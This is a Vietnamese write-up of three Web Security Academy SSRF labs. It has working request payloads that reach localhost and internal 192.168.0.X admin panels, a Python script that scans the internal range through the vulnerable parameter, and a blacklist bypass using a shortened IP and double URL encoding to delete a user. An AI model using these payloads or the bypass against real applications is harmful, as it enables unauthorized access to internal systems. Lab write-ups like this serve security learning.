# SSRF
 
 
## Lab: Basic SSRF against the local server
 
Thông thường chúng ta không thể truy cập vào chức năng quản trị viên ví dụ như /admin khi chưa được xác thực. Nhưng khi truy cập vào URL /admin từ localhost thì một số kiểm tra có thể bị bỏ qua:
 
```
POST /product/stock HTTP/1.1
Host: ac811fc91fa9cb6bc0ec9237009000c1.web-security-academy.net
 
stockApi=http://127.0.0.1/admin
 
 
HTTP/1.1 200 OK
 
<a href="/admin/delete?username=carlos">Delete</a>
```
 
như phản hồi ta thấy server đã fetch lại nội dung trong /admin và trả lại cho người dùng, từ đó ta xóa người dùng carlos và giải quyết thử thách
 
Note:
 
Tại sao các ứng dụng hoạt động theo cách này và mặc nhiên tin tưởng các yêu cầu đến từ máy cục bộ?  Điều này có thể phát sinh vì nhiều lý do:
+ Access control có thể được triển khai trong một thành phần khác nằm phía front-end của server. Khi một kết nối được thực hiện trở lại chính máy chủ, việc kiểm tra sẽ bị bỏ qua.
+ Với mục đích recovery thảm họa, ứng dụng có thể cho phép truy cập quản trị mà không cần đăng nhập, cho bất kỳ người dùng nào đến từ máy cục bộ. Điều này cung cấp một cách để quản trị viên khôi phục hệ thống trong trường hợp họ mất thông tin đăng nhập. Giả định ở đây là chỉ một người dùng hoàn toàn đáng tin cậy mới đến trực tiếp từ chính máy chủ.
+ Giao diện quản trị có thể đang lắng nghe trên một số port khác vì thế người dùng có thể không truy cập trực tiếp được.
 
---
## Lab: Basic SSRF against another back-end system
 
### Description
Phòng thí nghiệm này có tính năng kiểm tra kho, lấy dữ liệu từ hệ thống nội bộ.
 
Để giải quyết phòng thí nghiệm, hãy sử dụng chức năng kiểm tra kho để quét phạm vi 192.168.0.X nội bộ để tìm giao diện quản trị trên cổng 8080, sau đó sử dụng chức năng này để xóa carlos của người dùng.
 
### Analysis
 
Có một loại mối quan hệ khác thường phát sinh SSRF là khi máy chủ có thể tương tác với các hệ thống back-end khác mà người dùng có thể truy cập trực tiếp. Các hệ thống này thường có địa chỉ ip private không thể định tuyến được. Vì thế trong một số trường hợp SSRF chúng ta cần tìm ra địa chỉ ip của máy chủ để thực hiện exploit.
 
Dưới đây là script để tìm IP
```python
 
import requests
 
URL = 'https://ac771f041f635a7cc0a9310100a90041.web-security-academy.net/product/stock'
cookies = {'session': 'OKHuNr4TQlvXPTluBx79JBlrWoXUQGAs',}
 
for i in range(1,256):
    data = {
    'stockApi': f'http://192.168.0.{i}:8080/admin'
    }
 
    r  = requests.post(URL, cookies=cookies, data=data)
    if r.status_code == 200: # response 500 server error is not ip correct
        print (i, "OK")
        break
    else:
        print(i, "Fail")
 
```
 
```
110 Fail
111 Fail
112 Fail
113 Fail
114 Fail
115 Fail
116 Fail
117 OK
```
=> địa chỉ ip của server là 192.168.0.117
```
POST /product/stock HTTP/1.1
Host: ac771f041f635a7cc0a9310100a90041.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
 
stockApi=http://192.168.0.117:8080/admin/delete?username=carlos
```
 
---
 
## Lab: SSRF with blacklist-based input filter

Challenge này có black list có thể chứa

```
127.0.0.1
a
```
Chúng ta có thể bypass địa chỉ 127.0.0.1 bằng cách dùng short url loại bỏ đi một số kí tự 0. Bypass `a` bằng cách dùng url double encode %25%36%31

payload cuối cùng là:
```
stockApi=http://127.0.1/%25%36%31dmin
```

Sau đó phản hồi đưa chúng ta đến với trang quản trị admin panel
```
<div>
<span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
<div>
```
Sau đó xóa tên carlos và giải quyết challenge. Kí tự `a` trong carlos cũng phải double encode để bypass.

```
POST /product/stock HTTP/1.1
Host: ac181f661f9946c1c05d8a4f007d0065.web-security-academy.net

stockApi=http://127.0.1/%25%36%31dmin/delete?username=c%25%36%31rlos


HTTP/1.1 302 Found
Location: /admin
```

---

## Lab: 


